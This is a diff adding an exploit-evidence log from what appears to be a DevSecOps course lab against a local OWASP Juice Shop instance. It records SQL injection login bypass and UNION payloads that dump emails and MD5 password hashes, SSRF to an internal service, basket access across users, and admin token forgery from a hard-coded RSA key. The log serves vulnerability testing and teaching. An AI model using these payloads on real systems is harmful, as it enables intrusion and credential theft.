@@ -1,0 +1,102 @@
+IE3142 - exploit evidence: VULNERABLE BASELINE
+target   : http://localhost:3000
+baseline : /home/user/ie3142-devsecops/build/runtime/app-vuln/lib/insecurity.ts
+date     : 2026-09-30 09:51:25Z
+node     : v22.14.0
+
+
+[*] Target              : http://localhost:3000
+[*] Injection payload   : email = "' or 1=1--"
+[*] Baseline /api/Users (no credentials): HTTP 401
+
+[1m==============================================================================[0m
+[1mV1 - SQL Injection - authentication bypass[0m  [33m(CWE-89)[0m
+[1mTarget:[0m http://localhost:3000
+[1m==============================================================================[0m
+  POST /rest/user/login  -> HTTP 200
+  Issued JWT role        : admin
+  Issued JWT e-mail      : admin@juice-sh.op
+  GET /api/Users with the injected token -> HTTP 200, 23 user records returned
+  Control: legitimate login admin@juice-sh.op / admin123 -> HTTP 200 (still works)
+
+[31m[1m  >>> EXPLOITED[0m
+[1m==============================================================================[0m
+
+
+
+[*] Target            : http://localhost:3000
+[*] UNION payload     : q = ')) UNION SELECT id, email, password, role, '', '', '', '', '' FROM Users--
+
+[1m==============================================================================[0m
+[1mV2 - UNION SQL Injection - credential exfiltration[0m  [33m(CWE-89)[0m
+[1mTarget:[0m http://localhost:3000
+[1m==============================================================================[0m
+  GET /rest/products/search -> HTTP 200
+  Rows returned          : 80
+  E-mail addresses read  : 21
+  MD5 password hashes    : 24
+     - admin@juice-sh.op : 0192023a7bbd73250516f069df18b500  (role admin)
+     - jim@juice-sh.op : e541ca7ecf72b8d1286474fc613e5e45  (role customer)
+     - bender@juice-sh.op : 0c36e517e3fa95aabf1bbffc6744a4ef  (role customer)
+     - ciso@juice-sh.op : 861917d5fa5f1172f931dc700d81a8fb  (role deluxe)
+     ... 17 more
+  Control: /rest/products/search?q=apple -> HTTP 200, 3 products
+
+[31m[1m  >>> EXPLOITED[0m
+[1m==============================================================================[0m
+
+
+
+[*] Internal-only service listening on 127.0.0.1:9999
+[*] Asking the server to fetch : http://127.0.0.1:9999/internal/admin-backup.png
+
+[1m==============================================================================[0m
+[1mV3 - Server-Side Request Forgery - avatar URL[0m  [33m(CWE-918)[0m
+[1mTarget:[0m http://localhost:3000
+[1m==============================================================================[0m
+  POST /profile/image/url -> HTTP 302
+  Image URL submitted     : http://127.0.0.1:9999/internal/admin-backup.png
+  Requests received by the internal service : 1
+     - GET /internal/admin-backup.png  (User-Agent: node)
+  Control: public HTTPS image -> HTTP 302 (avatar update still functions)
+
+[31m[1m  >>> EXPLOITED[0m
+[1m==============================================================================[0m
+
+
+
+[1m==============================================================================[0m
+[1mV4 - Broken Object Level Authorization - basket[0m  [33m(CWE-639)[0m
+[1mTarget:[0m http://localhost:3000
+[1m==============================================================================[0m
+  Alice (victim)  basket id : 7
+  Bob   (attacker) basket id : 8
+  Alice GET /rest/basket/7      -> HTTP 200 (own basket, 2 products)
+  Bob   GET /rest/basket/7      -> HTTP 200
+  Bob saw 2 product(s) belonging to Alice
+     - Apple Juice (1000ml) x3  (unit price 1.99)
+     - Orange Juice (1000ml) x7  (unit price 2.99)
+  Control: Bob GET /rest/basket/8      -> HTTP 200 (his own basket still readable)
+
+[31m[1m  >>> EXPLOITED[0m
+[1m==============================================================================[0m
+
+
+
+[*] Target             : http://localhost:3000
+[*] Source inspected   : /home/user/ie3142-devsecops/build/runtime/app-vuln/lib/insecurity.ts
+
+[1m==============================================================================[0m
+[1mV5 - Hard-coded RSA private key - admin token forgery[0m  [33m(CWE-798)[0m
+[1mTarget:[0m http://localhost:3000
+[1m==============================================================================[0m
+  Recovered key from source : -----BEGIN RSA PRIVATE KEY----- ... (876 chars)
+  Forged token (no login performed): eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp...
+  GET /api/Users  (no token)     -> HTTP 401
+  GET /api/Users  (forged token) -> HTTP 200, 26 user records returned
+     - first record: {"id":1,"username":"","email":"admin@juice-sh.op","role":"admin","deluxeToken":"","lastLoginIp":"","profileIma
+
+[31m[1m  >>> EXPLOITED[0m
+[1m==============================================================================[0m
+
+
